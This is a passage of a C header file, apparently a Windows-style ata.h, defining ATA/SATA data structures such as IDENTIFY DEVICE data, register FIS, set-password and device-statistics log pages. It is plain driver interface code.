    USHORT NVCacheFeatureSetEnabled : 1;
    USHORT Reserved1 : 3;
    USHORT NVCachePowerModeVersion : 4;
    USHORT NVCacheFeatureSetVersion : 4;
  } NVCacheCapabilities;
  USHORT NVCacheSizeLSW;
  USHORT NVCacheSizeMSW;
  USHORT NominalMediaRotationRate;
  USHORT ReservedWord218;
  struct {
    UCHAR NVCacheEstimatedTimeToSpinUpInSeconds;
    UCHAR Reserved;
  } NVCacheOptions;
  USHORT WriteReadVerifySectorCountMode : 8;
  USHORT ReservedWord220 : 8;
  USHORT ReservedWord221;
  struct {
    USHORT MajorVersion : 12;
    USHORT TransportType : 4;
  } TransportMajorVersion;
  USHORT TransportMinorVersion;
  USHORT ReservedWord224[6];
  ULONG ExtendedNumberOfUserAddressableSectors[2];
  USHORT MinBlocksPerDownloadMicrocodeMode03;
  USHORT MaxBlocksPerDownloadMicrocodeMode03;
  USHORT ReservedWord236[19];
  USHORT Signature : 8;
  USHORT CheckSum : 8;
} IDENTIFY_DEVICE_DATA, *PIDENTIFY_DEVICE_DATA;

typedef struct _IDENTIFY_PACKET_DATA {
  struct {
    USHORT PacketType : 2;
    USHORT IncompleteResponse : 1;
    USHORT Reserved1 : 2;
    USHORT DrqDelay : 2;
    USHORT RemovableMedia : 1;
    USHORT CommandPacketType : 5;
    USHORT Reserved2 : 1;
    USHORT DeviceType : 2;
  } GeneralConfiguration;
  USHORT ResevedWord1;
  USHORT UniqueConfiguration;
  USHORT ReservedWords3[7];
  UCHAR SerialNumber[20];
  USHORT ReservedWords20[3];
  UCHAR FirmwareRevision[8];
  UCHAR ModelNumber[40];
  USHORT ReservedWords47[2];
  struct {
    USHORT VendorSpecific : 8;
    USHORT DmaSupported : 1;
    USHORT LbaSupported : 1;
    USHORT IordyDisabled : 1;
    USHORT IordySupported : 1;
    USHORT Obsolete : 1;
    USHORT OverlapSupported : 1;
    USHORT QueuedCommandsSupported : 1;
    USHORT InterleavedDmaSupported : 1;
    USHORT DeviceSpecificStandbyTimerValueMin : 1;
    USHORT Obsolete1 : 1;
    USHORT ReservedWord50 : 12;
    USHORT WordValid : 2;
  } Capabilities;
  USHORT ObsoleteWords51[2];
  USHORT TranslationFieldsValid : 3;
  USHORT Reserved3 : 13;
  USHORT ReservedWords54[8];
  struct {
    USHORT UDMA0Supported : 1;
    USHORT UDMA1Supported : 1;
    USHORT UDMA2Supported : 1;
    USHORT UDMA3Supported : 1;
    USHORT UDMA4Supported : 1;
    USHORT UDMA5Supported : 1;
    USHORT UDMA6Supported : 1;
    USHORT MDMA0Supported : 1;
    USHORT MDMA1Supported : 1;
    USHORT MDMA2Supported : 1;
    USHORT DMASupported : 1;
    USHORT ReservedWord62 : 4;
    USHORT DMADIRBitRequired : 1;
  } DMADIR;
  USHORT MultiWordDMASupport : 8;
  USHORT MultiWordDMAActive : 8;
  USHORT AdvancedPIOModes : 8;
  USHORT ReservedByte64 : 8;
  USHORT MinimumMWXferCycleTime;
  USHORT RecommendedMWXferCycleTime;
  USHORT MinimumPIOCycleTime;
  USHORT MinimumPIOCycleTimeIORDY;
  USHORT ReservedWords69[2];
  USHORT BusReleaseDelay;
  USHORT ServiceCommandDelay;
  USHORT ReservedWords73[2];
  USHORT QueueDepth : 5;
  USHORT ReservedWord75 : 11;
  struct {
    USHORT Reserved0 : 1;
    USHORT SataGen1 : 1;
    USHORT SataGen2 : 1;
    USHORT SataGen3 : 1;
    USHORT Reserved1 : 5;
    USHORT HIPM : 1;
    USHORT PhyEvents : 1;
    USHORT Reserved3 : 2;
    USHORT HostAutoPS : 1;
    USHORT DeviceAutoPS : 1;
    USHORT Reserved4 : 1;
    USHORT Reserved5 : 1;
    USHORT CurrentSpeed : 3;
    USHORT SlimlineDeviceAttention : 1;
    USHORT HostEnvironmentDetect : 1;
    USHORT Reserved : 10;
  } SerialAtaCapabilities;
  struct {
    USHORT Reserved0 : 1;
    USHORT Reserved1 : 2;
    USHORT DIPM : 1;
    USHORT Reserved2 : 1;
    USHORT AsynchronousNotification : 1;
    USHORT SoftwareSettingsPreservation : 1;
    USHORT Reserved3 : 9;
  } SerialAtaFeaturesSupported;
  struct {
    USHORT Reserved0 : 1;
    USHORT Reserved1 : 2;
    USHORT DIPM : 1;
    USHORT Reserved2 : 1;
    USHORT AsynchronousNotification : 1;
    USHORT SoftwareSettingsPreservation : 1;
    USHORT DeviceAutoPS : 1;
    USHORT Reserved3 : 8;
  } SerialAtaFeaturesEnabled;
  USHORT MajorRevision;
  USHORT MinorRevision;
  struct {
    USHORT SmartCommands : 1;
    USHORT SecurityMode : 1;
    USHORT RemovableMedia : 1;
    USHORT PowerManagement : 1;
    USHORT PacketCommands : 1;
    USHORT WriteCache : 1;
    USHORT LookAhead : 1;
    USHORT ReleaseInterrupt : 1;
    USHORT ServiceInterrupt : 1;
    USHORT DeviceReset : 1;
    USHORT HostProtectedArea : 1;
    USHORT Obsolete1 : 1;
    USHORT WriteBuffer : 1;
    USHORT ReadBuffer : 1;
    USHORT Nop : 1;
    USHORT Obsolete2 : 1;
    USHORT DownloadMicrocode : 1;
    USHORT Reserved1 : 2;
    USHORT AdvancedPm : 1;
    USHORT Msn : 1;
    USHORT PowerUpInStandby : 1;
    USHORT ManualPowerUp : 1;
    USHORT Reserved2 : 1;
    USHORT SetMax : 1;
    USHORT Reserved3 : 3;
    USHORT FlushCache : 1;
    USHORT Reserved4 : 1;
    USHORT WordValid : 2;
  } CommandSetSupport;
  struct {
    USHORT Reserved0 : 5;
    USHORT GpLogging : 1;
    USHORT Reserved1 : 2;
    USHORT WWN64Bit : 1;
    USHORT Reserved2 : 5;
    USHORT WordValid : 2;
  } CommandSetSupportExt;
  struct {
    USHORT SmartCommands : 1;
    USHORT SecurityMode : 1;
    USHORT RemovableMedia : 1;
    USHORT PowerManagement : 1;
    USHORT PacketCommands : 1;
    USHORT WriteCache : 1;
    USHORT LookAhead : 1;
    USHORT ReleaseInterrupt : 1;
    USHORT ServiceInterrupt : 1;
    USHORT DeviceReset : 1;
    USHORT HostProtectedArea : 1;
    USHORT Obsolete1 : 1;
    USHORT WriteBuffer : 1;
    USHORT ReadBuffer : 1;
    USHORT Nop : 1;
    USHORT Obsolete2 : 1;
    USHORT DownloadMicrocode : 1;
    USHORT Reserved1 : 2;
    USHORT AdvancedPm : 1;
    USHORT Msn : 1;
    USHORT PowerUpInStandby : 1;
    USHORT ManualPowerUp : 1;
    USHORT Reserved2 : 1;
    USHORT SetMax : 1;
    USHORT Reserved3 : 3;
    USHORT FlushCache : 1;
    USHORT Reserved : 3;
  } CommandSetActive;
  struct {
    USHORT Reserved0 : 5;
    USHORT GpLogging : 1;
    USHORT Reserved1 : 2;
    USHORT WWN64Bit : 1;
    USHORT Reserved2 : 5;
    USHORT WordValid : 2;
  } CommandSetActiveExt;
  USHORT UltraDMASupport : 8;
  USHORT UltraDMAActive : 8;
  USHORT TimeRequiredForNormalEraseModeSecurityEraseUnit;
  USHORT TimeRequiredForEnhancedEraseModeSecurityEraseUnit;
  USHORT CurrentAPMLevel;
  USHORT MasterPasswordID;
  USHORT HardwareResetResult;
  USHORT ReservedWords94[14];
  USHORT WorldWideName[4];
  USHORT ReservedWords112[13];
  USHORT AtapiZeroByteCount;
  USHORT ReservedWord126;
  USHORT MsnSupport : 2;
  USHORT ReservedWord127 : 14;
  USHORT SecurityStatus;
  USHORT VendorSpecific[31];
  USHORT ReservedWord160[16];
  USHORT ReservedWord176[46];
  struct {
    USHORT MajorVersion : 12;
    USHORT TransportType : 4;
  } TransportMajorVersion;
  USHORT TransportMinorVersion;
  USHORT ReservedWord224[31];
  USHORT Signature : 8;
  USHORT CheckSum : 8;
} IDENTIFY_PACKET_DATA, *PIDENTIFY_PACKET_DATA;

typedef struct _REGISTER_FIS {
  UCHAR FisType;
  UCHAR Reserved0 : 7;
  UCHAR CmdReg : 1;
  UCHAR Command;
  UCHAR Features;
  UCHAR SectorNumber;
  UCHAR CylinderLow;
  UCHAR CylinderHigh;
  UCHAR DeviceHead;
  UCHAR SectorNumberExp;
  UCHAR CylinderLowExp;
  UCHAR CylinderHighExp;
  UCHAR FeaturesExp;
  UCHAR SectorCount;
  UCHAR SectorCountExp;
  UCHAR Reserved2;
  UCHAR Control;
  ULONG Reserved3;
} REGISTER_FIS, *PREGISTER_FIS;

typedef union _ATA_HYBRID_INFO_FIELDS {
  _ANONYMOUS_STRUCT struct {
    UCHAR HybridPriority : 4;
    UCHAR Reserved0 : 1;
    UCHAR InfoValid : 1;
    UCHAR Reserved1 : 2;
  } DUMMYSTRUCTNAME;
  UCHAR AsUchar;
} ATA_HYBRID_INFO_FIELDS, *PATA_HYBRID_INFO_FIELDS;

typedef struct _DEVICE_SET_PASSWORD {
  struct {
    USHORT PasswordIdentifier : 1;
    USHORT Reserved1 : 7;
    USHORT MasterPasswordCapability : 1;
    USHORT Reserved2 : 7;
  } ControlWord;
  USHORT Password[16];
  USHORT MasterPasswordIdentifier;
  USHORT Reserved[238];
} DEVICE_SET_PASSWORD, *PDEVICE_SET_PASSWORD;

typedef struct _IDENTIFY_DEVICE_DATA_LOG_PAGE_HEADER {
  ULONGLONG RevisionNumber : 16;
  ULONGLONG PageNumber : 8;
  ULONGLONG Reserved : 39;
  ULONGLONG Valid : 1;
} IDENTIFY_DEVICE_DATA_LOG_PAGE_HEADER, *PIDENTIFY_DEVICE_DATA_LOG_PAGE_HEADER;

typedef struct _IDENTIFY_DEVICE_DATA_LOG_PAGE_SUPPORTED_CAPABILITIES {
  IDENTIFY_DEVICE_DATA_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG WRV : 1;
    ULONGLONG WriteUncorrectable : 1;
    ULONGLONG GplDma : 1;
    ULONGLONG DmMode3 : 1;
    ULONGLONG FreeFall : 1;
    ULONGLONG SenseData : 1;
    ULONGLONG EPC : 1;
    ULONGLONG SmartErrorLogging : 1;
    ULONGLONG SmartSelfTest : 1;
    ULONGLONG Reserved9 : 1;
    ULONGLONG Streaming : 1;
    ULONGLONG GPL : 1;
    ULONGLONG WriteFuaExt : 1;
    ULONGLONG Unload : 1;
    ULONGLONG DownloadMicrocode : 1;
    ULONGLONG Reserved15ForCFA : 1;
    ULONGLONG APM : 1;
    ULONGLONG PUIS : 1;
    ULONGLONG SpinUp : 1;
    ULONGLONG Reserved19 : 1;
    ULONGLONG Cmd48Bit : 1;
    ULONGLONG Reserved21 : 1;
    ULONGLONG FlushCacheExt : 1;
    ULONGLONG Smart : 1;
    ULONGLONG VolatileWriteCache : 1;
    ULONGLONG ReadLookahead : 1;
    ULONGLONG Reserved26 : 1;
    ULONGLONG WriteBuffer : 1;
    ULONGLONG ReadBuffer : 1;
    ULONGLONG NOP : 1;
    ULONGLONG Reserved30 : 1;
    ULONGLONG RZAT : 1;
    ULONGLONG Cmd28bit : 1;
    ULONGLONG DownloadMicrocodeDma : 1;
    ULONGLONG Reserved34 : 1;
    ULONGLONG WriteBufferDma : 1;
    ULONGLONG ReadBufferDma : 1;
    ULONGLONG Reserved37 : 1;
    ULONGLONG LpsMisalignmentReporting : 1;
    ULONGLONG DRAT : 1;
    ULONGLONG Reserved40ForCFA : 1;
    ULONGLONG AmaxAddr : 1;
    ULONGLONG SetEpcPowerSource : 1;
    ULONGLONG LowPowerStandby : 1;
    ULONGLONG DSN : 1;
    ULONGLONG RequestSenseDeviceFault : 1;
    ULONGLONG Reserved : 17;
    ULONGLONG Valid : 1;
  } SupportedCapabilities;
  struct {
    ULONGLONG DmMinTransferSize : 16;
    ULONGLONG DmMaxTransferSize : 16;
    ULONGLONG DmOffsetsImmediateSupported : 1;
    ULONGLONG DmImmediateSupported : 1;
    ULONGLONG DmOffsetsDeferredSupported : 1;
    ULONGLONG Reserved : 28;
    ULONGLONG Valid : 1;
  } DownloadMicrocodeCapabilities;
  struct {
    ULONGLONG Rate : 16;
    ULONGLONG Reserved : 47;
    ULONGLONG Valid : 1;
  } NominalMediaRotationRate;
  struct {
    ULONGLONG Factor : 4;
    ULONGLONG Reserved : 59;
    ULONGLONG Valid : 1;
  } NominalFormFactor;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 31;
    ULONGLONG Valid : 1;
  } WRVSectorCountMode3;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 31;
    ULONGLONG Valid : 1;
  } WRVSectorCountMode2;
  struct {
    ULONGLONG Name;
    ULONGLONG Reserved : 63;
    ULONGLONG Valid : 1;
  } WorldWideName;
  struct {
    ULONGLONG TrimSupported : 1;
    ULONGLONG Reserved : 62;
    ULONGLONG Valid : 1;
  } DataSetManagement;
  struct {
    ULONGLONG UtilizationA : 32;
    ULONGLONG UtilizationB : 32;
    ULONGLONG Reserved0 : 32;
    ULONGLONG UtilizationInterval : 8;
    ULONGLONG UtilizationUnit : 8;
    ULONGLONG UtilizationType : 8;
    ULONGLONG Reserved1 : 7;
    ULONGLONG Valid : 1;
  } UtilizationPerUnitTime;
  struct {
    ULONGLONG DateTimeRateBasisSupported : 1;
    ULONGLONG Reserved0 : 3;
    ULONGLONG PowerOnHoursRateBasisSupported : 1;
    ULONGLONG Reserved1 : 3;
    ULONGLONG SincePowerOnRateBasisSupported : 1;
    ULONGLONG Reserved2 : 14;
    ULONGLONG SettingRateBasisSupported : 1;
    ULONGLONG Reserved3 : 39;
    ULONGLONG Valid : 1;
  } UtilizationUsageRateSupport;
  struct {
    ULONGLONG Zoned : 2;
    ULONGLONG Reserved : 61;
    ULONGLONG Valid : 1;
  } ZonedCapabilities;
  struct {
    ULONGLONG ReportZonesExtSupported : 1;
    ULONGLONG NonDataOpenZoneExtSupported : 1;
    ULONGLONG NonDataCloseZoneExtSupported : 1;
    ULONGLONG NonDataFinishZoneExtSupported : 1;
    ULONGLONG NonDataResetWritePointersExtSupported : 1;
    ULONGLONG Reserved : 58;
    ULONGLONG Valid : 1;
  } SupportedZacCapabilities;
  UCHAR Reserved[392];
} IDENTIFY_DEVICE_DATA_LOG_PAGE_SUPPORTED_CAPABILITIES, *PIDENTIFY_DEVICE_DATA_LOG_PAGE_SUPPORTED_CAPABILITIES;

typedef struct _IDENTIFY_DEVICE_DATA_LOG_PAGE_ZONED_DEVICE_INFO {
  IDENTIFY_DEVICE_DATA_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG URSWRZ : 1;
    ULONGLONG Reserved : 62;
    ULONGLONG Valid : 1;
  } ZonedDeviceCapabilities;
  struct {
    ULONGLONG Reserved : 63;
    ULONGLONG Valid : 1;
  } ZonedDeviceSettings;
  struct {
    ULONGLONG Number : 32;
    ULONGLONG Reserved : 31;
    ULONGLONG Valid : 1;
  } OptimalNumberOfOpenSequentialWritePreferredZones;
  struct {
    ULONGLONG Number : 32;
    ULONGLONG Reserved : 31;
    ULONGLONG Valid : 1;
  } OptimalNumberOfNonSequentiallyWrittenSequentialWritePreferredZones;
  struct {
    ULONGLONG Number : 32;
    ULONGLONG Reserved : 31;
    ULONGLONG Valid : 1;
  } MaxNumberOfOpenSequentialWriteRequiredZones;
  struct {
    ULONGLONG ZacMinorVersion : 16;
    ULONGLONG Reserved0 : 47;
    ULONGLONG Valid : 1;
  } Version;
  UCHAR Reserved[456];
} IDENTIFY_DEVICE_DATA_LOG_PAGE_ZONED_DEVICE_INFO, *PIDENTIFY_DEVICE_DATA_LOG_PAGE_ZONED_DEVICE_INFO;

typedef struct _CURRENT_DEVICE_INTERNAL_STATUS_LOG {
  UCHAR LogAddress;
  UCHAR Reserved0[3];
  ULONG OrganizationID;
  USHORT Area1LastLogPage;
  USHORT Area2LastLogPage;
  USHORT Area3LastLogPage;
  UCHAR Reserved2[368];
  UCHAR SavedDataAvailable;
  UCHAR SavedDataGenerationNumber;
  UCHAR ReasonIdentifier[128];
} CURRENT_DEVICE_INTERNAL_STATUS_LOG, *PCURRENT_DEVICE_INTERNAL_STATUS_LOG;

typedef struct _SAVED_DEVICE_INTERNAL_STATUS_LOG {
  UCHAR LogAddress;
  UCHAR Reserved0[3];
  ULONG OrganizationID;
  USHORT Area1LastLogPage;
  USHORT Area2LastLogPage;
  USHORT Area3LastLogPage;
  UCHAR Reserved2[368];
  UCHAR SavedDataAvailable;
  UCHAR GenerationNumber;
  UCHAR ReasonIdentifier[128];
} SAVED_DEVICE_INTERNAL_STATUS_LOG, *PSAVED_DEVICE_INTERNAL_STATUS_LOG;

typedef struct _DEVICE_STATISTICS_LOG_PAGE_HEADER {
  ULONGLONG RevisionNumber : 16;
  ULONGLONG PageNumber : 8;
  ULONGLONG Reserved : 40;
} DEVICE_STATISTICS_LOG_PAGE_HEADER, *PDEVICE_STATISTICS_LOG_PAGE_HEADER;

typedef struct _GP_LOG_SUPPORTED_DEVICE_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  UCHAR NumberOfEntries;
  UCHAR LogPageNumbers[503];
} GP_LOG_SUPPORTED_DEVICE_STATISTICS, *PGP_LOG_SUPPORTED_DEVICE_STATISTICS;

typedef struct _GP_LOG_GENERAL_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } LifeTimePoweronResets;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } PoweronHours;
  struct {
    ULONGLONG Count : 48;
    ULONGLONG Reserved : 8;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } LogicalSectorsWritten;
  struct {
    ULONGLONG Count : 48;
    ULONGLONG Reserved : 8;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } WriteCommandCount;
  struct {
    ULONGLONG Count : 48;
    ULONGLONG Reserved : 8;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } LogicalSectorsRead;
  struct {
    ULONGLONG Count : 48;
    ULONGLONG Reserved : 8;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } ReadCommandCount;
  struct {
    ULONGLONG TimeStamp : 48;
    ULONGLONG Reserved : 8;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } DateAndTime;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } PendingErrorCount;
  struct {
    ULONGLONG Value : 16;
    ULONGLONG Reserved : 40;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } WorkloadUtilizaton;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved0 : 28;
    ULONGLONG RateBasis : 4;
    ULONGLONG RateValidity : 8;
    ULONGLONG Reserved1 : 8;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } UtilizationUsageRate;
  UCHAR Reserved[424];
} GP_LOG_GENERAL_STATISTICS, *PGP_LOG_GENERAL_STATISTICS;

typedef struct _GP_LOG_FREE_FALL_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberofFreeFallEventsDetected;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } OverlimitShockEvents;
  UCHAR Reserved[488];
} GP_LOG_FREE_FALL_STATISTICS, *PGP_LOG_FREE_FALL_STATISTICS;

typedef struct _GP_LOG_ROTATING_MEDIA_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } SpindleMotorPoweronHours;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } HeadFlyingHours;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } HeadLoadEvents;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfReallocatedLogicalSectors;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } ReadRecoveryAttempts;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfMechanicalStartFailures;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfReallocationCandidateLogicalSectors;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfHighPriorityUnloadEvents;
  UCHAR Reserved[440];
} GP_LOG_ROTATING_MEDIA_STATISTICS, *PGP_LOG_ROTATING_MEDIA_STATISTICS;

typedef struct _GP_LOG_GENERAL_ERROR_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfReportedUncorrectableErrors;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfResetsBetweenCommandAcceptanceAndCommandCompletion;
  UCHAR Reserved[488];
} GP_LOG_GENERAL_ERROR_STATISTICS, *PGP_LOG_GENERAL_ERROR_STATISTICS;

typedef struct _GP_LOG_TEMPERATURE_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } CurrentTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } AverageShortTermTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } AverageLongTermTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } HighestTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } LowestTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } HighestAverageShortTermTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } LowestAverageShortTermTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } HighstAverageLongTermTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } LowestAverageLongTermTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } TimeInOverTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } SpecifiedMaximumOperatingTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
